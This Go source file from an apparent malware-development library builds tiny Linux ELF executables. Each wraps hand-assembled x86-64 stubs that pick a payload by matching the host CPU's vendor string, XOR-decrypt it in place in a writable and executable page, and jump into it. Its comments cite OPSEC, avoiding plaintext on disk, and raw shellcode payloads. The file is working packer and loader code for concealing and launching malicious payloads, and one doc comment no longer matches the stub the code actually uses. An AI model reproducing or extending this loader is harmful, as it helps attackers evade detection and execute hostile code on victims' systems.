package packer

import (
	"encoding/binary"
	"fmt"

	"github.com/oioio-space/maldev/pe/packer/transform"
)

// Bundle-as-executable: minimal stub asm + minimal ELF wrapper. The
// produced binary is a few hundred bytes total — no Go runtime, no
// dynamic linker, no on-disk plaintext for the matching payload until
// it gets XOR-decrypted into the stub's own page (which is RWX) at
// startup.
//
// This sits next to the higher-level `cmd/bundle-launcher` Go-runtime
// approach (~5 MB binary, full Go runtime + memfd+execve dispatch).
// The all-asm path trades operator ergonomics (no Negate / no full
// fingerprint loop in v0.69) for binary size and OPSEC.

// bundleStubVendorAware returns stub bytes that walk the
// FingerprintEntry table and JMP into the first entry whose predicate
// either has PT_MATCH_ALL set OR has PT_CPUID_VENDOR set with a
// VendorString matching the host's CPUID-leaf-0 vendor (or all-zero
// wildcard). On no match, sys_exit_group(0).
//
// Compared to [bundleStubScanMatchAll], this stub adds:
//
//   - A CPUID prologue right after the PIC trampoline that reads the
//     12-byte host vendor onto the stack and pins the pointer in RSI.
//   - A per-entry vendor compare: if PT_CPUID_VENDOR is set, the entry's
//     12-byte VendorString gets compared (8 + 4 byte) against the host
//     vendor; an all-zero entry vendor is treated as a wildcard match.
//
// Per-entry asm (replacing the bare PT_MATCH_ALL test):
//
//	movzx r9d, byte [r8]              ; predType
//	test  r9b, 8                      ; PT_MATCH_ALL
//	jnz   .matched
//	test  r9b, 1                      ; PT_CPUID_VENDOR
//	jz    .next                       ; no recognised check → skip
//	mov   r10, [r8+4]
//	cmp   r10, [rsi]
//	jne   .vendor_zero_check
//	mov   r10d, [r8+12]
//	cmp   r10d, [rsi+8]
//	je    .matched
//	.vendor_zero_check:
//	mov   r10, [r8+4]
//	test  r10, r10
//	jnz   .next                       ; non-zero entry vendor + no match → fail
//	mov   r10d, [r8+12]
//	test  r10d, r10d
//	jz    .matched                    ; all-zero entry vendor → wildcard
//	.next:
//	add   r8, 48
//	inc   eax
//	jmp   .loop
//
// Total stub: ~160 bytes. Bundle binaries with two real-target entries
// land in the 450-550 B range — still under 1 KiB.
//
// Build-number predicates (PT_WIN_BUILD) are intentionally not wired
// in this Linux stub: the host-side hostWinBuild() returns 0 on
// Linux, so any PT_WIN_BUILD entry with non-zero BuildMin would fail
// regardless. A Windows minor (WrapBundleAsExecutableWindows) will
// add the PEB read + range compare alongside the minimal-PE writer.
func bundleStubVendorAware() []byte {
	return []byte{
		// === PIC trampoline ===                  offset 0
		// call .pic
		0xe8, 0x00, 0x00, 0x00, 0x00,
		// pop r15
		0x41, 0x5f,
		// add r15, imm32  (imm32 patched at wrap time, bytes 10..13)
		0x49, 0x81, 0xc7, 0x00, 0x00, 0x00, 0x00,
		// trampoline + add takes bytes 0..13 (14 bytes)

		// === CPUID prologue: read host vendor → 16-byte stack slot,
		//                     pin pointer in RSI ===
		// sub rsp, 16
		0x48, 0x83, 0xec, 0x10,
		// mov rdi, rsp
		0x48, 0x89, 0xe7,
		// xor eax, eax
		0x31, 0xc0,
		// cpuid
		0x0f, 0xa2,
		// mov [rdi], ebx
		0x89, 0x1f,
		// mov [rdi+4], edx
		0x89, 0x57, 0x04,
		// mov [rdi+8], ecx
		0x89, 0x4f, 0x08,
		// mov rsi, rdi          ; rsi = host vendor ptr, preserved
		0x48, 0x89, 0xfe,
		// CPUID prologue takes 22 bytes — ends at offset 36

		// === Loop setup ===                      offset 36
		// movzx ecx, word [r15+6]
		0x41, 0x0f, 0xb7, 0x4f, 0x06,
		// mov r8d, [r15+8]
		0x45, 0x8b, 0x47, 0x08,
		// add r8, r15
		0x4d, 0x01, 0xf8,
		// xor eax, eax
		0x31, 0xc0,
		// loop-setup takes 14 bytes — ends at offset 50

		// === Loop ===                            offset 50 = .loop
		// Final offset table (recomputed exhaustively, see comment block
		// after the array for the trace):
		//   .loop                = 50
		//   .vendor_zero_check   = 89
		//   .next                = 107
		//   .no_match            = 115
		//   .matched             = 124
		// All Jcc displacements below = (target − end-of-Jcc-instruction).
		//
		// cmp eax, ecx
		0x39, 0xc8,
		// jge .no_match  (115 − 54 = 61 = 0x3d)
		0x7d, 0x3d,
		// movzx r9d, byte [r8]
		0x45, 0x0f, 0xb6, 0x08,
		// test r9b, 8
		0x41, 0xf6, 0xc1, 0x08,
		// jnz .matched   (124 − 64 = 60 = 0x3c)
		0x75, 0x3c,
		// test r9b, 1
		0x41, 0xf6, 0xc1, 0x01,
		// jz .next       (107 − 70 = 37 = 0x25)
		0x74, 0x25,
		// mov r10, [r8+4]
		0x4d, 0x8b, 0x50, 0x04,
		// cmp r10, [rsi]
		0x4c, 0x3b, 0x16,
		// jne .vendor_zero_check  (89 − 79 = 10 = 0x0a)
		0x75, 0x0a,
		// mov r10d, [r8+12]
		0x45, 0x8b, 0x50, 0x0c,
		// cmp r10d, [rsi+8]
		0x44, 0x3b, 0x56, 0x08,
		// je .matched    (124 − 89 = 35 = 0x23)
		0x74, 0x23,

		// .vendor_zero_check:                     offset 89
		// mov r10, [r8+4]
		0x4d, 0x8b, 0x50, 0x04,
		// test r10, r10
		0x4d, 0x85, 0xd2,
		// jnz .next      (107 − 98 = 9 = 0x09)
		0x75, 0x09,
		// mov r10d, [r8+12]
		0x45, 0x8b, 0x50, 0x0c,
		// test r10d, r10d
		0x45, 0x85, 0xd2,
		// jz .matched    (124 − 107 = 17 = 0x11)
		0x74, 0x11,

		// .next:                                  offset 107
		// add r8, 48
		0x49, 0x83, 0xc0, 0x30,
		// inc eax
		0xff, 0xc0,
		// jmp .loop  (50 − 115 = −65 = 0xbf signed)
		0xeb, 0xbf,

		// === .no_match: Linux sys_exit_group(0) === offset 115
		// mov eax, 231
		0xb8, 0xe7, 0x00, 0x00, 0x00,
		// xor edi, edi
		0x31, 0xff,
		// syscall
		0x0f, 0x05,
		// no_match takes 9 bytes — ends at offset 124

		// === .matched: idx in eax → compute &PayloadEntry[eax] === offset 124
		// Offset trace (each line shows cumulative byte count):
		//   PIC trampoline       0  → 14
		//   CPUID prologue      14  → 36
		//   loop setup          36  → 50
		//   .loop body cmp+jge  50  → 54
		//   movzx + test r9b,8  54  → 62
		//   jnz .matched        62  → 64
		//   test r9b,1 + jz     64  → 70
		//   mov r10/cmp/jne     70  → 79
		//   mov r10d/cmp/je     79  → 89
		//   .vendor_zero_check  89  → 98
		//   second jnz/etc/jz   98  → 107
		//   .next: add/inc/jmp 107  → 115
		//   .no_match block    115  → 124
		//   .matched starts at 124
		//
		// .matched body:
		// mov r9d, [r15+12]
		0x45, 0x8b, 0x4f, 0x0c,
		// mov r10d, eax
		0x41, 0x89, 0xc2,
		// shl r10d, 5
		0x41, 0xc1, 0xe2, 0x05,
		// add r9d, r10d
		0x45, 0x01, 0xd1,
		// add r9, r15
		0x4d, 0x01, 0xf9,
		// mov rcx, r9
		0x4c, 0x89, 0xc9,
		// .matched body takes 19 bytes — ends at offset 144

		// === Decrypt+JMP tail (verbatim from prior stubs) ===
		// mov edi, [rcx]
		0x8b, 0x39,
		// add rdi, r15
		0x4c, 0x01, 0xff,
		// mov esi, [rcx+4]
		0x8b, 0x71, 0x04,
		// lea r8, [rcx+16]
		0x4c, 0x8d, 0x41, 0x10,
		// xor r9d, r9d
		0x45, 0x31, 0xc9,
		// .dec:
		// test esi, esi
		0x85, 0xf6,
		// jz .jmp_payload  (+0x1b)
		0x74, 0x1b,
		// mov al, [rdi]
		0x8a, 0x07,
		// mov dl, r9b
		0x44, 0x88, 0xca,
		// and dl, 15
		0x80, 0xe2, 0x0f,
		// movzx edx, dl
		0x0f, 0xb6, 0xd2,
		// xor al, [r8+rdx]
		0x41, 0x32, 0x04, 0x10,
		// mov [rdi], al
		0x88, 0x07,
		// inc rdi
		0x48, 0xff, 0xc7,
		// inc r9d
		0x41, 0xff, 0xc1,
		// dec esi
		0xff, 0xce,
		// jmp .dec  (-0x1f)
		0xeb, 0xe1,
		// .jmp_payload:
		// mov edi, [rcx]
		0x8b, 0x39,
		// add rdi, r15
		0x4c, 0x01, 0xff,
		// jmp rdi
		0xff, 0xe7,
	}
}

// bundleStubScanMatchAll returns stub bytes that walk the
// FingerprintEntry table and JMP into the first entry whose predicate
// has the PT_MATCH_ALL bit set (bit 3 of PredicateType). On no match,
// invokes Linux sys_exit_group(0) — the "BundleFallbackExit" semantic
// from the spec.
//
// Compared to [bundleStubAlwaysIdx0], this proves the loop+dispatch
// abstraction: the index that gets decrypted+jmp'd is no longer
// hard-coded; it's the result of an O(n) scan over the wire-format
// fingerprint table. Vendor-string + build-range comparisons can be
// inserted into the per-entry test transparently — public API of
// [WrapBundleAsExecutableLinux] does not change.
//
// Asm flow (additions over the always-idx-0 stub marked ★):
//
//	  call .pic ; pop r15 ; add r15, BUNDLE_OFF   (PIC)
//	★ movzx ecx, word [r15+6]              ; count
//	★ mov   r8d, [r15+8]                   ; fpOff
//	★ add   r8, r15                        ; r8 = &fingerprint[0]
//	★ xor   eax, eax                       ; idx
//	★ .loop:
//	★   cmp   eax, ecx
//	★   jge   .no_match
//	★   test  byte [r8], 8                 ; PT_MATCH_ALL bit
//	★   jnz   .matched
//	★   add   r8, 48                       ; sizeof FingerprintEntry
//	★   inc   eax
//	★   jmp   .loop
//	★ .no_match:
//	★   mov   eax, 231                     ; sys_exit_group(0)
//	★   xor   edi, edi
//	★   syscall
//	★ .matched:                            ; eax = matched index
//	★   mov   r9d, [r15+12]                ; plOff
//	★   mov   r10d, eax
//	★   shl   r10d, 5                      ; *32 (sizeof PayloadEntry)
//	★   add   r9d, r10d
//	★   add   r9, r15                      ; r9 = &PayloadEntry[eax]
//	★   mov   rcx, r9                      ; reuse-rcx convention for tail
//	  ; (existing decrypt+jmp tail follows — unchanged)
//
// Total: 73 (always-idx-0 tail) + ~50 (scan prologue) ≈ 120-130 bytes.
//
// Index 5 of `bundleOffsetImm32Pos` STILL points to the call/pop
// trampoline's `add r15, imm32` immediate — the loop is between
// that and the original tail.
func bundleStubScanMatchAll() []byte {
	return []byte{
		// === PIC trampoline (same as bundleStubAlwaysIdx0) ===
		// call .pic
		0xe8, 0x00, 0x00, 0x00, 0x00,
		// pop r15
		0x41, 0x5f,
		// add r15, imm32  (imm32 at bytes 10..13 — patched at wrap time)
		0x49, 0x81, 0xc7, 0x00, 0x00, 0x00, 0x00,

		// === Scan loop ===
		// movzx ecx, word [r15+6]
		0x41, 0x0f, 0xb7, 0x4f, 0x06,
		// mov r8d, [r15+8]
		0x45, 0x8b, 0x47, 0x08,
		// add r8, r15
		0x4d, 0x01, 0xf8,
		// xor eax, eax
		0x31, 0xc0,
		// .loop:                                  (offset 28 from start)
		// cmp eax, ecx                           (offset 0 within loop block)
		0x39, 0xc8,
		// jge .no_match  (+0x0e, skipping rest of loop body)
		//   end-of-jge=4; .no_match=18; disp = 18-4 = 14 = 0x0e
		0x7d, 0x0e,
		// test byte [r8], 8                     (offset 4)
		0x41, 0xf6, 0x00, 0x08,
		// jnz .matched   (+0x11, skipping rest + .no_match)
		//   end-of-jnz=10; .matched=27; disp = 27-10 = 17 = 0x11
		0x75, 0x11,
		// add r8, 48                            (offset 10)
		0x49, 0x83, 0xc0, 0x30,
		// inc eax                               (offset 14)
		0xff, 0xc0,
		// jmp .loop  (-0x12 = -18 → back to cmp eax, ecx)
		//   end-of-jmp=18; .loop=0; disp = 0-18 = -18 = 0xee
		0xeb, 0xee,

		// === .no_match: Linux sys_exit_group(0) ===
		// mov eax, 231
		0xb8, 0xe7, 0x00, 0x00, 0x00,
		// xor edi, edi
		0x31, 0xff,
		// syscall
		0x0f, 0x05,

		// === .matched: idx in eax → compute &PayloadEntry[eax] ===
		// mov r9d, [r15+12]
		0x45, 0x8b, 0x4f, 0x0c,
		// mov r10d, eax
		0x41, 0x89, 0xc2,
		// shl r10d, 5
		0x41, 0xc1, 0xe2, 0x05,
		// add r9d, r10d
		0x45, 0x01, 0xd1,
		// add r9, r15
		0x4d, 0x01, 0xf9,
		// mov rcx, r9
		0x4c, 0x89, 0xc9,

		// === Decrypt+JMP tail (verbatim from bundleStubAlwaysIdx0) ===
		// mov edi, [rcx]
		0x8b, 0x39,
		// add rdi, r15
		0x4c, 0x01, 0xff,
		// mov esi, [rcx+4]
		0x8b, 0x71, 0x04,
		// lea r8, [rcx+16]
		0x4c, 0x8d, 0x41, 0x10,
		// xor r9d, r9d
		0x45, 0x31, 0xc9,
		// .dec:
		// test esi, esi
		0x85, 0xf6,
		// jz .jmp_payload (+0x1b)
		0x74, 0x1b,
		// mov al, [rdi]
		0x8a, 0x07,
		// mov dl, r9b
		0x44, 0x88, 0xca,
		// and dl, 15
		0x80, 0xe2, 0x0f,
		// movzx edx, dl
		0x0f, 0xb6, 0xd2,
		// xor al, [r8+rdx]
		0x41, 0x32, 0x04, 0x10,
		// mov [rdi], al
		0x88, 0x07,
		// inc rdi
		0x48, 0xff, 0xc7,
		// inc r9d
		0x41, 0xff, 0xc1,
		// dec esi
		0xff, 0xce,
		// jmp .dec  (-0x1f)
		0xeb, 0xe1,
		// .jmp_payload:
		// mov edi, [rcx]
		0x8b, 0x39,
		// add rdi, r15
		0x4c, 0x01, 0xff,
		// jmp rdi
		0xff, 0xe7,
	}
}

// bundleStubAlwaysIdx0 returns the stub bytes for the simplest possible
// runtime path: ignore the fingerprint table entirely and always
// XOR-decrypt + JMP into PayloadEntry[0].
//
// Operationally this is what `BundleFallbackBehaviour=BundleFallbackFirst`
// asks for in the spec. The full evaluator loop ships in v0.69+; this
// baseline proves the wrap mechanics (RIP-relative bundle addressing,
// PayloadEntry indexing, in-place XOR, dispatch) and gives us a
// concrete byte target for size assertions.
//
// Asm flow (bundle base resolved via call/pop PIC trick):
//
//	  call .pic              ; push RIP (= .pic label) and jump
//	.pic:
//	  pop  r15               ; r15 = .pic = stub base + 5
//	  add  r15, BUNDLE_OFF   ; r15 = bundle base (BUNDLE_OFF = stubLen - 5)
//	  mov  ecx, [r15 + 12]   ; ecx = plTableOff (BundleHeader[12:16])
//	  add  rcx, r15          ; rcx = &PayloadEntry[0]
//	  mov  edi, [rcx]        ; edi = DataRVA
//	  add  rdi, r15          ; rdi = data ptr
//	  mov  esi, [rcx + 4]    ; esi = DataSize
//	  lea  r8,  [rcx + 16]   ; r8 = key ptr (16 bytes)
//	  xor  r9d, r9d          ; r9 = byte counter
//	.decrypt:
//	  test esi, esi
//	  jz   .jmp_payload
//	  mov  al,  [rdi]
//	  mov  dl,  r9b
//	  and  dl,  15
//	  movzx edx, dl          ; edx = counter % 16
//	  xor  al,  [r8 + rdx]
//	  mov  [rdi], al
//	  inc  rdi
//	  inc  r9d
//	  dec  esi
//	  jmp  .decrypt
//	.jmp_payload:
//	  mov  edi, [rcx]        ; rewind rdi to start
//	  add  rdi, r15
//	  jmp  rdi
//
// Total: 73 bytes. The 4-byte BUNDLE_OFF immediate at file offset 10
// gets patched by [WrapBundleAsExecutableLinux] once the stub length
// is known.
func bundleStubAlwaysIdx0() []byte {
	return []byte{
		// call .pic
		0xe8, 0x00, 0x00, 0x00, 0x00,
		// pop r15
		0x41, 0x5f,
		// add r15, imm32  (imm32 at bytes 10..13 — patched at wrap time)
		0x49, 0x81, 0xc7, 0x00, 0x00, 0x00, 0x00,
		// mov ecx, [r15+12]
		0x41, 0x8b, 0x4f, 0x0c,
		// add rcx, r15
		0x4c, 0x01, 0xf9,
		// mov edi, [rcx]
		0x8b, 0x39,
		// add rdi, r15
		0x4c, 0x01, 0xff,
		// mov esi, [rcx+4]
		0x8b, 0x71, 0x04,
		// lea r8, [rcx+16]
		0x4c, 0x8d, 0x41, 0x10,
		// xor r9d, r9d
		0x45, 0x31, 0xc9,
		// .decrypt:
		// test esi, esi
		0x85, 0xf6,
		// jz +0x1b → .jmp_payload
		0x74, 0x1b,
		// mov al, [rdi]
		0x8a, 0x07,
		// mov dl, r9b
		0x44, 0x88, 0xca,
		// and dl, 15
		0x80, 0xe2, 0x0f,
		// movzx edx, dl
		0x0f, 0xb6, 0xd2,
		// xor al, [r8 + rdx*1]
		0x41, 0x32, 0x04, 0x10,
		// mov [rdi], al
		0x88, 0x07,
		// inc rdi
		0x48, 0xff, 0xc7,
		// inc r9d
		0x41, 0xff, 0xc1,
		// dec esi
		0xff, 0xce,
		// jmp .decrypt  (back -0x1f bytes)
		0xeb, 0xe1,
		// .jmp_payload:
		// mov edi, [rcx]
		0x8b, 0x39,
		// add rdi, r15
		0x4c, 0x01, 0xff,
		// jmp rdi
		0xff, 0xe7,
	}
}

// bundleOffsetImm32Pos is the byte offset of the patchable imm32
// inside [bundleStubAlwaysIdx0]'s output — i.e. the "BUNDLE_OFF"
// operand of `add r15, imm32`. Exposed so tests + the wrap helper
// agree on the layout.
const bundleOffsetImm32Pos = 10

// WrapBundleAsExecutableLinux composes a runnable Linux x86-64 ELF
// from a bundle blob. Layout:
//
//	[ELF Ehdr (64 B) | PT_LOAD Phdr (56 B) | stub asm (~73 B) | bundle blob]
//
// Steps:
//
//  1. Emit the always-idx-0 stub (the fingerprint evaluator extension
//     ships in a follow-up commit; this is the baseline that proves
//     the wrap mechanics).
//  2. Patch the stub's `add r15, BUNDLE_OFF` immediate with the byte
//     distance from the .pic label (5 bytes into the stub) to the
//     bundle's first byte. Equivalent to `len(stub) - 5`.
//  3. Concatenate stub + bundle.
//  4. Wrap in [transform.BuildMinimalELF64].
//
// The result is a self-contained ELF — no PT_INTERP, no DT_NEEDED, no
// imports. The kernel maps it RWX and jumps to entry; the stub
// resolves the bundle base via call/pop PIC, locates PayloadEntry[0],
// XOR-decrypts the data in place, and JMPs to it. The decrypted bytes
// must therefore be raw position-independent shellcode (NOT a packed
// PE/ELF — those need the cmd/bundle-launcher reflective path).
//
// Today's limitation: always selects payload 0 regardless of fingerprint
// matching. Equivalent to the spec's `BundleFallbackFirst`. The full
// CPUID + PEB evaluator loop ships in the next stub revision and
// drops in transparently — this function's signature does not change.
func WrapBundleAsExecutableLinux(bundle []byte) ([]byte, error) {
	if len(bundle) < BundleHeaderSize {
		return nil, fmt.Errorf("%w: %d < BundleHeaderSize %d",
			ErrBundleTruncated, len(bundle), BundleHeaderSize)
	}
	if magic := binary.LittleEndian.Uint32(bundle[0:4]); magic != BundleMagic {
		return nil, fmt.Errorf("%w: %#x != %#x",
			ErrBundleBadMagic, magic, BundleMagic)
	}

	// Use the vendor-aware scan stub: walks the FingerprintEntry table,
	// matches entries by PT_MATCH_ALL bit OR PT_CPUID_VENDOR with a
	// 12-byte host CPUID compare (all-zero VendorString = wildcard).
	// On no match, exit_group(0). PT_WIN_BUILD is intentionally not
	// wired in this Linux stub (host build = 0); a future
	// WrapBundleAsExecutableWindows minor will add the PEB read.
	stub := bundleStubVendorAware()
	bundleOff := uint32(len(stub)) - 5 // distance from .pic label
	binary.LittleEndian.PutUint32(stub[bundleOffsetImm32Pos:], bundleOff)

	combined := make([]byte, 0, len(stub)+len(bundle))
	combined = append(combined, stub...)
	combined = append(combined, bundle...)

	return transform.BuildMinimalELF64(combined)
}
